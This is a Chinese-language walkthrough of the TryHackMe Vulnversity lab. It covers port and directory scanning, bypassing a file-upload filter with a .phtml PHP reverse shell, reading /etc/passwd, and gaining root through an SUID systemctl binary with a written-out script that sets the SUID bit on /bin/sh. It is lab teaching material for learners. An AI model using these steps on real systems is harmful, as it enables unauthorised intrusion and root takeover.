# Vulnversity-练习

TryHackMe实验房间链接：https://tryhackme.com/room/vulnversity

## 介绍

通过本关卡，可以练习主动侦察（信息收集）、网络应用程序攻击和权限提升相关知识点。

## 端口扫描

Nmap 是一个免费、开源和强大的工具，用于发现计算机网络上的主机和服务。在我们的示例中，我们使用 nmap 扫描目标机器，以识别在特定端口上运行的所有服务。Nmap 有很多功能，下面总结了它提供的一些常用功能。

```shell
nmap flag                                   Description（描述）
-sV                                         尝试确定正在运行的服务的版本
-p <x> or -p-	                            扫描指定端口或者扫描所有端口
-Pn	                                        禁用主机发现功能（禁ping），只扫描打开的端口（ -n 不解析dns）
-A                                          启用操作系统检测和版本检测，执行内置脚本以进一步枚举
-sC	                                        使用nmap默认脚本进行扫描
-v	                                        输出详细信息
-sU                          	            UDP 端口扫描
-sS	                                        TCP SYN端口扫描（半开式扫描 不完成三次握手）
```

对目标机进行端口扫描：

```shell
nmap -sV -O 10.10.163.135
```

![image-20221012003317993](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012003317993.png)

答题卡：

![image-20221012000528576](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012000528576.png)

## 目录扫描

目标机开启了web服务，我们用GoBuster 来对网站目录进行扫描，尝试找到一个能够上传shell文件的目录。

GoBuster 是一个用于暴力破解URI (目录和文件)、 DNS 子域名和虚拟主机名的工具，你可以在kali的/usr/share/wordlists目录下寻找默认的爆破字典使用。

GoBuster的dir模式常用参数：

```shell
GoBuster flag	                                   Description（描述）
-e	                                               扩展模式，打印完整的 URL
-u	                                               目标 URL
-w	                                               使用的爆破字典路径
-U and -P	                                       用于基本认证的用户名和密码
-p <x>	                                           用于发送请求的代理  
-c <http cookies>	                               指定用于模拟身份验证的 cookie

#更多用法请参考：https://github.com/OJ/gobuster
```

使用一个 wordlist 运行 GoBuster：

```shell
#gobuster dir -u http://<ip>:port -w <word list location>
gobuster dir -u http://10.10.163.135:3333 -w /usr/share/wordlists/dirb/common.txt
```

![image-20221012015108923](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012015108923.png)

![image-20221012004630545](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012004630545.png)

答题卡

![image-20221012003544410](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012003544410.png)

## 获取web服务器权限

现在我们已经找到一个可以上传文件的表单页面，我们可以在该页面上传和执行我们的payload，尝试获取web服务器的权限。

我们尝试上传一个php文件结果被网站拦截，为了确定有哪些扩展名的文件不会被阻止上传，我们将对上传表单进行fuzz处理。

打开burpsuite，使用Intruder 模块(用于自动化定制攻击)，首先，创建一个扩展名字典，命名为phpex.txt，内容如下（此处也可使用seclists项目的Fuzz类字典）:

```
.php
.php3
.php4
.php5
.phtml
.php7
.phps
.php-s
.pht
.phar
```

确保 BurpSuite 被配置为拦截所有浏览器流量，上传一个文件，一旦这个请求被捕获，将其发送给Intruder模块，并选择“Sniper”攻击类型；

在“Positions”选项界面，找到文件名并选中扩展名，点击"Add §"按钮；

进入Payloads选项，配置好刚才创建的扩展名字典，并禁用编码选项；

最后运行攻击即可：

![image-20221012030839521](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012030839521.png)

![image-20221012031243782](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012031243782.png)

![image-20221012031647384](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012031647384.png)

我们已经找到可以用于上传的文件扩展名.phtml（它返回的结果长度最短，因为没有报错信息），我们现在尝试上传一个php的反向shell文件，修改php文件内容中的ip为攻击机ip，将文件命名为shell.phtml，并上传该文件到目标站点。

> 此处使用的反向shell文件下载链接：https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

上传成功之后，在攻击机设置一个netcat监听器，监听的端口为反向shell文件内容中的端口，在目标网站上找到反向shell文件，点击激活即可，成功在攻击机终端获得一个shell：

![image-20221012010459997](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012010459997.png)

![image-20221012010342600](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012010342600.png)

此处也可以通过cat /etc/passwd，查看用户的账户信息（一般是直接找/home目录）：

![image-20221012011136301](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012011136301.png)

答题卡

![image-20221012011437063](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012011437063.png)

![image-20221012011510830](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012011510830.png)

![image-20221012011353393](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012011353393.png)

## 权限提升

现在尝试升级权限到root用户权限。

在 Linux 中，SUID (执行时会设置所有者userId)是授予文件的一种特殊类型权限，SUID 为用户提供临时权限，允许用户在文件所有者的权限下运行程序/文件。

例如，用于更改你的密码的二进制文件上设置了 SUID 位(/usr/bin/passwd)，这是因为要更改你的密码，需要写入你无权访问的shadow文件，而一般只有root 用户有这个权限对shadow文件进行写入，因此该文件需要暂时具有 root 权限来完成密码更改（所以有必要给这个文件设置SUID位）。

![image-20221012012455029](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012012455029.png)

在目标系统上搜索所以SUID文件：

```shell
find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null
#-perm 为文件设置了任何权限位
#-4000 具有 SUID 位的文件的数值
# 2> /dev/null 将错误结果输出到回收站
```

![image-20221012013238186](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012013238186.png)

systemctl 是用于控制systemd初始化服务的工具，在 systemctl 上启用 setuid 是不正常的，使用GTFOBins，查找SUID可执行文件的利用方法：https://gtfobins.github.io/

![image-20221012014651389](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012014651389.png)

![image-20221012020317598](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012020317598.png)

先获得一个更稳定的shell：

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

修改一下上图所提供的脚本，然后在目标机的低权限shell上运行：

```shell
#复制以下所有代码到目标机的shell界面即可（该脚本的目的是创建一个系统服务并以root用户身份运行它）

TK=$(mktemp).service   #我们创建一个名为“TK”的环境变量。在这个变量中，我们调用mktemp命令来创建一个临时文件，作为Systemd服务单元文件（.service在最后）


#创建一个单元文件并将其分配给环境变量--以此完成服务单元文件的构造
#下面是我们执行单元文件所需要的配置
#默认情况下：systemctl将在/etc/system/systemd中搜索文件。
#但是当前的登录用户没有权限写入/etc/system/systemd，我们通过将单元文件内容 一行一行地回显到刚才创建的env变量中来解决这个问题
echo '[Service]    #调用echo命令开始回显输入(注意单引号，通过不包括关闭行的第二个单引号，我们能够输入多个单行并完成我们的Systemd服务单元文件)     
Type=oneshot           
ExecStart=/bin/sh -c "chmod +s /bin/sh"  #当服务启动时调用默认的系统shell（-c 告诉shell执行引号中的所有内容）
[Install]                                #单元文件的第二部分
WantedBy=multi-user.target' > $TK        #设置此服务将运行的状态(或运行级别)，将我们的所有输入指向TK env变量

#使用 systemctl 运行这个单元文件
/bin/systemctl link $TK                  #这使得我们的单元文件可用于systemctl命令，即使它在标准搜索路径之外
/bin/systemctl enable --now $TK          #启用一个单元实例--服务单元文件得以运行
```

systemctl参考手册：https://www.freedesktop.org/software/systemd/man/systemctl.html

上述脚本已经以root身份给/bin/sh加上了s权限，现在运行sh命令（-p用于保持sh获得的权限）即可获得root权限：

```shell
sh -p
```

![image-20221012030442114](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012030442114.png)

答题卡

![image-20221012024437619](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012024437619.png)
